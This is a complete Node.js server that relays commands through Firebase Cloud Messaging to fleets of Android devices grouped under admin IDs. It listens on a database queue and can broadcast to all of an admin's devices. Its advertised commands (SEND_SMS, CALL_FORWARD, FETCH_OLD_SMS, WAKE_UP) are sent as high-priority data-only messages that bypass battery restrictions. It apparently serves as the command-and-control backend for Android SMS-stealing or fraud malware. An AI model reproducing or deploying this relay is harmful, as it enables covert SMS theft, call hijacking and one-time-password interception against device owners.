const admin = require("firebase-admin");
const express = require("express");
const app = express();

const dbURL = "https://fir-33a57-default-rtdb.firebaseio.com";
const saContent = process.env.FIREBASE_SERVICE_ACCOUNT;

if (!saContent) {
  console.error("************************************************************");
  console.error("FATAL: FIREBASE_SERVICE_ACCOUNT is missing!");
  console.error("************************************************************");
  if (process.env.NODE_ENV === 'production') process.exit(1);
}

try {
  const serviceAccount = JSON.parse(saContent || "{}");
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: dbURL
  });
  console.log("✅ Firebase Admin Initialized");
} catch (e) {
  console.error("FATAL: Invalid Service Account JSON:", e.message);
  if (process.env.NODE_ENV === 'production') process.exit(1);
}

const db = admin.database();

console.log("🎧 HIGH-PRIORITY FCM Relay — listening on fcm_queue...");

/* =========================================================
 * ⭐ Helper: यह function FCM delivery का status Firebase में लिखता है
 * Path: fcmStatus/{adminId}/{deviceId}/{msgId}
 * Android भी इसी path पर status लिखता है (worker-level result)
 * ========================================================= */
async function writeDeliveryStatus(adminId, deviceId, queueId, commandType, success, detail) {
  if (!adminId || !deviceId) return;
  try {
    await db.ref(`fcmStatus/${adminId}/${deviceId}/${queueId}`).set({
      command: commandType,
      status: success ? "DELIVERED" : "FAILED",
      detail: detail || "",
      stage: "SERVER",
      timestamp: Date.now(),
      received: true
    });
    console.log(`[📊 STATUS] ${commandType} → ${success ? "DELIVERED" : "FAILED"} | queue=${queueId}`);
  } catch (e) {
    console.error(`[STATUS ERROR] ${e.message}`);
  }
}

/* =========================================================
 * ⭐ CORE: SEND HIGH-PRIORITY FCM (wakes device from Doze)
 * payload = { type: "SEND_SMS", data: { to, message, sim } }
 * ========================================================= */
async function sendHighPriorityFcm(deviceId, adminId, payload = {}) {
  const commandType = payload.type || "WAKE_UP";
  const commandData = payload.data || {};
  const queueId = payload.queueId || `${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;

  try {
    // ---- 1. Find the FCM token ----
    let token = null;

    if (adminId) {
      const snap = await db.ref(`fcmTokens/${adminId}/${deviceId}`).once("value");
      token = snap.val();
    }

    // Fallback 1: flat path
    if (!token) {
      const snap = await db.ref(`fcmTokens/${deviceId}`).once("value");
      token = snap.val();
    }

    // Fallback 2: legacy path
    if (!token) {
      const snap = await db.ref(`Users/${deviceId}/I/tk`).once("value");
      token = snap.val();
    }

    if (!token) {
      console.warn(`[SKIP] No token | device=${deviceId} admin=${adminId}`);
      await writeDeliveryStatus(adminId, deviceId, queueId, commandType, false, "no_token");
      return { success: false, reason: "no_token" };
    }

    // ---- 2. Build data payload — सभी parameters string में convert करो ----
    const dataPayload = {
      t: commandType,
      ts: Date.now().toString(),
      p: "high"
    };

    // ⭐ Command parameters merge करो (to, message, sim, number, action, start, count, आदि)
    Object.keys(commandData).forEach(k => {
      const v = commandData[k];
      if (v !== null && v !== undefined) {
        dataPayload[k] = String(v);
      }
    });

    // ⭐ queueId भी भेजो ताकि Android उसी id पर status report कर सके
    dataPayload.qid = queueId;

    // ---- 3. Build HIGH-PRIORITY DATA-ONLY message ----
    const message = {
      token: token,
      data: dataPayload,
      android: {
        priority: "high",       // bypasses Doze battery restrictions
        ttl: 60 * 1000          // 60 sec
      }
    };

    // ---- 4. Send ----
    const response = await admin.messaging().send(message);

    console.log(`[✅ SENT] device=${deviceId} type=${commandType} id=${response} | data=${JSON.stringify(dataPayload)}`);

    // ⭐ Firebase में server-side status लिखो
    await writeDeliveryStatus(adminId, deviceId, queueId, commandType, true, `FCM id: ${response}`);

    return { success: true, id: response };

  } catch (error) {
    console.error(`[❌ FCM ERROR] device=${deviceId}:`, error.message);

    // ---- 5. Clean up invalid tokens ----
    const invalid =
      error.code === "messaging/registration-token-not-registered" ||
      error.code === "messaging/invalid-registration-token";

    if (invalid) {
      try {
        if (adminId) await db.ref(`fcmTokens/${adminId}/${deviceId}`).remove();
        await db.ref(`fcmTokens/${deviceId}`).remove();
        console.log(`🧹 Removed invalid token for ${deviceId}`);
      } catch (e) {
        console.error("Cleanup error:", e.message);
      }
    }

    // ⭐ Firebase में FAILED status लिखो
    await writeDeliveryStatus(
      adminId,
      deviceId,
      queueId,
      commandType,
      false,
      error.message || "unknown_error"
    );

    return { success: false, reason: error.message };
  }
}

/* =========================================================
 * 📡 QUEUE LISTENER — instant trigger on admin action
 * ========================================================= */
db.ref("fcm_queue").on("child_added", async (snapshot) => {
  const queueId = snapshot.key;
  const payload = snapshot.val();

  if (!payload || !payload.targetUid) {
    console.log(`[QUEUE] Invalid entry ${queueId}, removing`);
    return db.ref(`fcm_queue/${queueId}`).remove();
  }

  const targetUid = payload.targetUid;
  const requestedBy = payload.requestedBy || null;
  const type = payload.type || "WAKE_UP";
  const data = payload.data || {};

  console.log(`[QUEUE] ⚡ target=${targetUid} type=${type} by=${requestedBy} | data=${JSON.stringify(data)}`);

  try {
    if (targetUid === "ALL") {
      await broadcastToAll(requestedBy, { type, data, queueId });
    } else {
      await sendHighPriorityFcm(targetUid, requestedBy, {
        type,
        data,
        queueId
      });
    }
  } catch (err) {
    console.error(`[ERROR] Task ${queueId}:`, err.message);
  } finally {
    // Always remove processed task
    db.ref(`fcm_queue/${queueId}`).remove();
  }
});

/* =========================================================
 * 📢 BROADCAST HELPER
 * payload = { type, data, queueId }
 * ========================================================= */
async function broadcastToAll(adminId, payload = {}) {
  if (!adminId) {
    console.warn("[BROADCAST] No adminId — skipping");
    return;
  }

  const type = payload.type || "WAKE_UP";
  const data = payload.data || {};

  const snap = await db.ref(`fcmTokens/${adminId}`).once("value");
  const tokens = snap.val() || {};
  const deviceIds = Object.keys(tokens);

  console.log(`[BROADCAST] Sending to ${deviceIds.length} devices of ${adminId} | type=${type}`);

  const results = await Promise.allSettled(
    deviceIds.map(id =>
      sendHighPriorityFcm(id, adminId, {
        type,
        data,
        queueId: `bc_${Date.now()}_${id.slice(-6)}`
      })
    )
  );

  let ok = 0;
  let fail = 0;
  results.forEach((r, i) => {
    if (r.status === "fulfilled" && r.value.success) {
      ok++;
    } else {
      fail++;
      const reason = r.status === "rejected"
        ? r.reason?.message
        : (r.value?.reason || "unknown");
      console.warn(`[BROADCAST FAIL] device=${deviceIds[i]} reason=${reason}`);
    }
  });

  console.log(`[BROADCAST] ✅ ${ok}/${deviceIds.length} delivered | ❌ ${fail} failed`);
}

/* =========================================================
 * 🌐 HEALTH CHECK
 * ========================================================= */
app.get("/", (req, res) => {
  res.send(`
    <html>
      <head><title>FCM Relay — Active</title></head>
      <body style="font-family:-apple-system,sans-serif;background:#0f172a;color:white;text-align:center;padding:3rem">
        <div style="display:inline-block;background:#1e293b;padding:2rem;border-radius:1rem">
          <h1 style="margin:0">🚀 FCM Relay Active</h1>
          <p style="color:#94a3b8">Mode: <b style="color:#10b981">HIGH-PRIORITY DATA-ONLY</b></p>
          <p style="color:#94a3b8">DB: <code style="color:#3b82f6">${dbURL}</code></p>
          <p style="color:#64748b;font-size:0.85rem">Listening on <code>fcm_queue</code></p>
          <p style="color:#64748b;font-size:0.85rem">Supports: SEND_SMS, CALL_FORWARD, FETCH_OLD_SMS, WAKE_UP, CHECK_ONLINE</p>
        </div>
      </body>
    </html>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`[SYSTEM] ✅ FCM Relay on port ${PORT}`);
});
